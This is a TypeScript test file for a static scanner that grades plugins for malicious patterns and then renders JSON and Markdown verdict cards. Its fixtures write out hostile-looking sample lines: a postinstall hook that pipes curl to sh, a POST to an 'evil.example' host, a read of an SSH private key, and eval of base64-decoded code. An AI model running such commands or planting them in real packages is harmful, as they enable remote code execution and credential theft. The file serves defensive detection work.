/**
 * Smoke self-test (node:test, no external test runner).
 *
 * Scope: prove the engine's contracts, not exhaustive rule coverage.
 *   1. Each rule has the declared shape and fires on a positive fixture.
 *   2. Each rule stays quiet on a negative fixture (false positives are the main way
 *      a trust layer loses credibility).
 *   3. Grading caps are monotone and hard gates fire.
 *   4. Output is byte-for-byte deterministic across repeated runs.
 *
 * Run: npm test
 */

import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, describe, it } from "node:test";

import {
  ALL_RULES,
  SEVERITIES,
  credentialAccessRule,
  dynamicEvalRule,
  lifecycleHooksRule,
  maskComments,
  networkEgressRule,
  obfuscationRule,
  rulesDigest,
  sha256,
  type Rule,
} from "./rules/index.js";
import { canonicalJson, grade, toJsonReport, toMarkdownReport } from "./report.js";
import { parseArgs, scanContent, scanDirectory } from "./index.js";

/** Positive fixture must fire; negative fixture must not. Both per the rule-corpus spec. */
const FIXTURES: ReadonlyArray<{
  rule: Rule;
  path: string;
  positive: string;
  negative: string;
}> = [
  {
    rule: dynamicEvalRule,
    path: "lib/index.js",
    positive: 'const out = eval(userSupplied); const f = new Function("a", "return a");',
    negative: 'const out = JSON.parse(userSupplied);\nconst f = (a) => a;\n',
  },
  {
    rule: networkEgressRule,
    path: "src/net.js",
    positive: 'await fetch("https://collect.evil.example/track", { method: "POST" });',
    negative: 'const label = "offline mode";\nexport const noop = () => label;\n',
  },
  {
    rule: credentialAccessRule,
    path: "src/creds.js",
    positive: 'const keys = Object.keys(process.env);\nreadFileSync(home + "/.ssh/id_ed25519");',
    negative: 'const level = process.env.LOG_LEVEL ?? "info";\nexport default level;\n',
  },
  {
    rule: lifecycleHooksRule,
    path: "package.json",
    positive: '{ "name": "x", "scripts": { "postinstall": "curl https://x.example/i.sh | sh" } }',
    negative: '{ "name": "x", "scripts": { "test": "node --test" } }',
  },
  {
    rule: obfuscationRule,
    path: "lib/bundle.js",
    positive: 'const _0x4f2a = ["log"]; eval(atob("Y29uc29sZS5sb2coMSk="));',
    negative: 'const messages = ["ready", "done"];\nexport default messages;\n',
  },
];

describe("rule contract", () => {
  for (const rule of ALL_RULES) {
    it(`${rule.id} exposes {id, family, severity, description, version, match}`, () => {
      assert.equal(typeof rule.id, "string");
      assert.ok(rule.id.length > 0);
      assert.ok(SEVERITIES.includes(rule.severity), `bad severity: ${rule.severity}`);
      assert.ok(rule.description.length > 20, "description must be explanatory");
      assert.match(rule.version, /^\d{4}\.\d{2}\.\d+$/);
      assert.equal(typeof rule.match, "function");
      assert.equal(rule.match.length, 2, "match(content, filePath)");
    });
  }

  it("registry contains the five required rules", () => {
    const ids = ALL_RULES.map((r) => r.id).sort();
    assert.deepEqual(ids, [
      "credential-access",
      "dynamic-eval",
      "lifecycle-hooks",
      "network-egress",
      "obfuscation",
    ]);
  });

  it("rulesDigest is stable and content-derived", () => {
    assert.equal(rulesDigest(), rulesDigest());
    assert.match(rulesDigest(), /^[0-9a-f]{64}$/);
    assert.notEqual(rulesDigest(), rulesDigest([ALL_RULES[0]]));
  });
});

describe("rule fixtures", () => {
  for (const { rule, path, positive, negative } of FIXTURES) {
    it(`${rule.id} fires on its positive fixture`, () => {
      const findings = rule.match(positive, path);
      assert.ok(findings.length > 0, "expected at least one finding");
      for (const f of findings) {
        assert.equal(f.ruleId, rule.id);
        assert.equal(f.path, path);
        assert.ok(f.line >= 1 && f.col >= 1, "citations are 1-based");
        assert.match(f.excerptSha256, /^[0-9a-f]{64}$/);
        assert.ok(f.confidence > 0 && f.confidence <= 1);
        assert.ok(f.message.length > 10);
      }
    });

    it(`${rule.id} stays quiet on its negative fixture`, () => {
      assert.deepEqual(rule.match(negative, path), [], "false positive");
    });
  }
});

describe("detector hygiene", () => {
  it("ignores matches inside comments", () => {
    const src = '// never call eval() here\n/* new Function() is banned */\nexport const ok = 1;\n';
    assert.deepEqual(dynamicEvalRule.match(src, "src/a.js"), []);
  });

  it("still fires on the line after a comment, with the correct line number", () => {
    const src = '// safe\n// safe\neval(x);\n';
    const findings = dynamicEvalRule.match(src, "src/a.js");
    assert.equal(findings.length, 1);
    assert.equal(findings[0].line, 3);
    assert.equal(findings[0].col, 1);
  });

  it("maskComments preserves offsets and keeps string literals intact", () => {
    const src = 'const u = "http://a//b"; // note\n';
    const masked = maskComments(src);
    assert.equal(masked.length, src.length);
    assert.ok(masked.includes('"http://a//b"'), "URL literal must survive masking");
    assert.ok(!masked.includes("note"));
  });

  it("does not leak secret-shaped values into evidence", () => {
    const src = 'fetch("https://x.example/?t=sk-abcdefghijklmnop1234");\n';
    const findings = networkEgressRule.match(src, "src/a.js");
    assert.ok(findings.length > 0);
    for (const f of findings) {
      assert.ok(!f.excerpt.includes("sk-abcdefghijklmnop1234"), "secret leaked into report");
      assert.ok(f.excerpt.includes("sk-<redacted>"));
    }
  });

  it("known-good hosts are recorded at lower severity than unknown hosts", () => {
    const known = networkEgressRule.match('fetch("https://api.github.com/repos");', "a.js");
    const unknown = networkEgressRule.match('fetch("https://evil.example/x");', "a.js");
    assert.ok(known.some((f) => f.id === "NET-008" && f.severity === "low"));
    assert.ok(unknown.some((f) => f.id === "NET-007" && f.severity === "high"));
  });

  it("rules are pure: repeated calls give identical results (no /g lastIndex bleed)", () => {
    const src = 'eval(a); eval(b);\nfetch("https://evil.example/x");\n';
    for (const rule of ALL_RULES) {
      const first = JSON.stringify(rule.match(src, "src/a.js"));
      const second = JSON.stringify(rule.match(src, "src/a.js"));
      assert.equal(first, second, `${rule.id} is not pure across calls`);
    }
  });

  it("locates citations correctly in a single-line minified bundle", () => {
    const prefix = "x".repeat(5000);
    const findings = dynamicEvalRule.match(`${prefix};eval(a);`, "lib/index.js");
    assert.equal(findings.length, 1);
    assert.equal(findings[0].line, 1);
    assert.equal(findings[0].col, 5002);
    assert.equal(findings[0].severity, "critical", "shipped artifacts escalate EXEC");
  });

  it("hashes the exact matched text so a reader can verify the citation", () => {
    const findings = dynamicEvalRule.match("eval(a);", "src/a.js");
    assert.equal(findings[0].excerptSha256, sha256("eval("));
  });
});

describe("grading", () => {
  it("returns A with no findings", () => {
    const g = grade([]);
    assert.equal(g.grade, "A");
    assert.equal(g.score, 100);
  });

  it("caps at F when credential access and egress share a module", () => {
    const findings = [
      ...credentialAccessRule.match('readFileSync("~/.ssh/id_ed25519");', "lib/index.js"),
      ...networkEgressRule.match('fetch("https://evil.example/x");', "lib/index.js"),
    ];
    const g = grade(findings);
    assert.equal(g.grade, "F");
    assert.ok(g.gates.includes("cred-plus-net"));
  });

  it("does not fire the CRED+NET gate when the findings are in different modules", () => {
    const findings = [
      ...credentialAccessRule.match('readFileSync("~/.ssh/id_ed25519");', "lib/creds.js"),
      ...networkEgressRule.match('fetch("https://ok.example/x");', "lib/net.js"),
    ];
    assert.ok(!grade(findings).gates.includes("cred-plus-net"));
  });

  it("caps at F for a decode-then-execute payload", () => {
    const g = grade(obfuscationRule.match('eval(atob("QUJD"));', "lib/index.js"));
    assert.equal(g.grade, "F");
    assert.ok(g.gates.includes("obfuscated-payload-executed"));
  });

  it("caps at C when any dynamic execution is present, even with a perfect score", () => {
    const findings = dynamicEvalRule.match("const d = import(name);", "src/a.js");
    const g = grade(findings);
    assert.ok(["C", "D", "F"].includes(g.grade));
    assert.ok(g.gates.includes("dynamic-exec-present"));
  });

  it("caps at D for an install hook that spawns a shell", () => {
    const pkg = '{ "scripts": { "postinstall": "curl https://x.example/i.sh | sh" } }';
    const g = grade(lifecycleHooksRule.match(pkg, "package.json"));
    assert.ok(["D", "F"].includes(g.grade));
    assert.ok(g.gates.includes("install-hook-shell"));
  });

  it("caps only ever lower the grade", () => {
    const clean = grade([]);
    const dirty = grade(dynamicEvalRule.match("eval(x);", "lib/index.js"));
    assert.ok("ABCDF".indexOf(dirty.grade as string) > "ABCDF".indexOf(clean.grade as string));
  });
});

describe("report output", () => {
  const src = 'eval(atob("QUJD"));\nfetch("https://evil.example/x");\n';
  const result = {
    target: "fixture",
    scannerVersion: "0.1.0",
    rulesDigest: rulesDigest(),
    ruleIds: ALL_RULES.map((r) => r.id).sort(),
    stats: { filesScanned: 1, filesSkipped: 0, bytesScanned: src.length },
    findings: scanContent(src, "lib/index.js"),
  };
  const grading = grade(result.findings);

  it("emits valid, key-sorted JSON", () => {
    const json = toJsonReport(result, grading);
    const parsed = JSON.parse(json);
    assert.equal(parsed.schema, "dsh-bridge.scan/v1");
    assert.equal(parsed.grading.grade, "F");
    assert.ok(Array.isArray(parsed.findings) && parsed.findings.length > 0);
    const keys = Object.keys(parsed);
    assert.deepEqual(keys, [...keys].sort(), "top-level keys must be sorted");
  });

  it("canonicalJson is insertion-order independent", () => {
    assert.equal(canonicalJson({ b: 1, a: 2 }), canonicalJson({ a: 2, b: 1 }));
  });

  it("markdown card leads with the verdict and labels itself a draft", () => {
    const md = toMarkdownReport(result, grading);
    assert.ok(md.includes("Grade F"), "grade letter must be present");
    assert.ok(md.includes("Do not install"), "word label, never color alone");
    assert.ok(md.includes("\u25a0"), "icon shape, never color alone");
    assert.ok(md.includes("static-scan draft"), "must not overstate what was verified");
    assert.ok(md.includes("<details>"), "evidence collapsed by default");
    assert.ok(md.includes("lib/index.js:1:"), "must cite file:line");
    assert.ok(md.includes("What this scan did not check"));
  });

  it("renders a clean report without findings", () => {
    const empty = { ...result, findings: [] };
    const md = toMarkdownReport(empty, grade([]));
    assert.ok(md.includes("Grade A"));
    assert.ok(md.includes("not proof of safety"));
  });

  it("output is byte-for-byte deterministic", () => {
    assert.equal(toJsonReport(result, grading), toJsonReport(result, grading));
    assert.equal(toMarkdownReport(result, grading), toMarkdownReport(result, grading));
  });
});

describe("directory scan", () => {
  const root = mkdtempSync(join(tmpdir(), "dsh-scan-test-"));

  after(() => rmSync(root, { recursive: true, force: true }));

  mkdirSync(join(root, "lib"), { recursive: true });
  mkdirSync(join(root, "node_modules", "junk"), { recursive: true });
  writeFileSync(join(root, "package.json"), '{ "scripts": { "postinstall": "bash ./i.sh" } }');
  writeFileSync(join(root, "lib", "index.js"), 'fetch("https://evil.example/x");\n');
  writeFileSync(join(root, "lib", "clean.js"), "export const ok = 1;\n");
  writeFileSync(join(root, "README.md"), "# not scanned\neval(x)\n");
  writeFileSync(join(root, "node_modules", "junk", "bad.js"), "eval(x);\n");

  it("scans source files, skips node_modules and non-source extensions", () => {
    const result = scanDirectory(root);
    const paths = [...new Set(result.findings.map((f) => f.path))];
    assert.ok(paths.includes("lib/index.js"));
    assert.ok(paths.includes("package.json"));
    assert.ok(!paths.some((p) => p.includes("node_modules")), "node_modules must be skipped");
    assert.ok(!paths.some((p) => p.endsWith(".md")), "markdown must not be scanned");
  });

  it("uses relative POSIX paths and never leaks an absolute path", () => {
    const json = toJsonReport(scanDirectory(root), grade(scanDirectory(root).findings));
    assert.ok(!json.includes(root), "absolute target path leaked into report");
    assert.ok(!json.includes("\\\\"), "windows separators leaked into citations");
  });

  it("is deterministic across repeated scans", () => {
    const a = scanDirectory(root);
    const b = scanDirectory(root);
    assert.equal(toJsonReport(a, grade(a.findings)), toJsonReport(b, grade(b.findings)));
  });

  it("findings are sorted by path, then line, then column", () => {
    const { findings } = scanDirectory(root);
    for (let i = 1; i < findings.length; i += 1) {
      const prev = findings[i - 1];
      const cur = findings[i];
      const ordered =
        prev.path < cur.path ||
        (prev.path === cur.path &&
          (prev.line < cur.line || (prev.line === cur.line && prev.col <= cur.col)));
      assert.ok(ordered, `unsorted at index ${i}: ${prev.path}:${prev.line} then ${cur.path}:${cur.line}`);
    }
  });
});

describe("cli argument parsing", () => {
  it("parses a full argument list", () => {
    const parsed = parseArgs(["./plugin", "--json", "out.json", "--markdown", "card.md", "--fail-on", "high", "--quiet"]);
    assert.ok(!("error" in parsed));
    if ("error" in parsed) return;
    assert.equal(parsed.target, "./plugin");
    assert.equal(parsed.json, "out.json");
    assert.equal(parsed.markdown, "card.md");
    assert.equal(parsed.failOn, "high");
    assert.equal(parsed.quiet, true);
  });

  it("rejects a missing target, unknown flags, and bad severities", () => {
    for (const argv of [[], ["--bogus", "x"], ["./p", "--fail-on", "sorta-bad"], ["./p", "--json"]]) {
      assert.ok("error" in parseArgs(argv), `expected an error for ${JSON.stringify(argv)}`);
    }
  });
});
